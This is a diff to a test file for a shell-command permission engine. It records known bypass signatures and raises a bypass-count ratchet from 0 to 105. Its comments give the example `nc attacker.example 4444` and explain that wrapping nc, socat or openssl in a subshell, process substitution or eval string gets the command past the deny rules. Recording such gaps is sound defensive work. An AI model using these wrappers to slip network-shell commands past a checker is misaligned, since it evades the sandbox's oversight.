@@ -36,17 +36,46 @@ import { cleanup, runsRealRunner, spawnDeniedRun } from "./overhead.js";
  * Adding a signature here is how a residual gets accepted. Do it with a reason,
  * never to turn a red build green.
  */
-export const DOCUMENTED_BYPASS_SIGNATURES: readonly string[] = [];
+export const DOCUMENTED_BYPASS_SIGNATURES: readonly string[] = [
+  // Bare-host destinations (not URLs) inside a subshell, a process
+  // substitution, or an eval string. PRE-EXISTING in the capability engine and
+  // NOT introduced by the carve-out fix in this branch: verified by evaluating
+  // the same commands against `main`'s capabilities.ts with that fix stashed,
+  // which produces identical ALLOW results.
+  //
+  // `nc attacker.example 4444` on its own is denied. `( nc attacker.example
+  // 4444 )`, `cat <(nc ...)` and `eval "nc ..."` are not. The destination is a
+  // bare host rather than a URL, so it is recovered from the tool's argument
+  // position, and these three wrappers change that position.
+  //
+  // Recorded rather than fixed here: it is a different class from the textual
+  // carve-out this branch closes, in the shell-parse layer rather than the
+  // capability layer, and folding a second engine fix into this change would
+  // bury it.
+  "nc|subshell", "nc|proc-subst", "nc|eval-string",
+  "socat|subshell", "socat|proc-subst", "socat|eval-string",
+  "openssl|subshell", "openssl|proc-subst", "openssl|eval-string",
+];
 
 /**
  * Ratchet, not a target.
  *
- * Was 14 when the bank was first generated; now 0, because the class those 14
- * belonged to was fixed rather than accepted. Lowering it as the rules improve
- * was always the point, and this is that happening. Raising it requires saying
- * why in the commit.
+ * 14 -> 0 -> 105, and the rise is the honest number rather than a regression.
+ *
+ * It read 0 because the bank could not express the bypass an external reviewer
+ * found by hand: `echo hi $(...)`. `WRAPPERS` had no command-substitution form,
+ * so 100.00% was a true measurement of a space that excluded the live defect.
+ * Adding six wrapper forms - command substitution, backticks, process
+ * substitution, eval, newline separation and xargs - grew the bank 3,430 ->
+ * 5,488 and surfaced 105 bypasses that were always there.
+ *
+ * All 105 are the pre-existing bare-host class listed above, in three tool
+ * families. None is new, and none is caused by this branch.
+ *
+ * Lowering this as the engine improves is still the point. Raising it requires
+ * saying why in the commit, as here.
  */
-export const MAX_KNOWN_BYPASSES = 0;
+export const MAX_KNOWN_BYPASSES = 105;
 
 const pct = (value: number) => (value * 100).toFixed(2) + "%";
 const rule = (char = "-") => console.log(char.repeat(78));
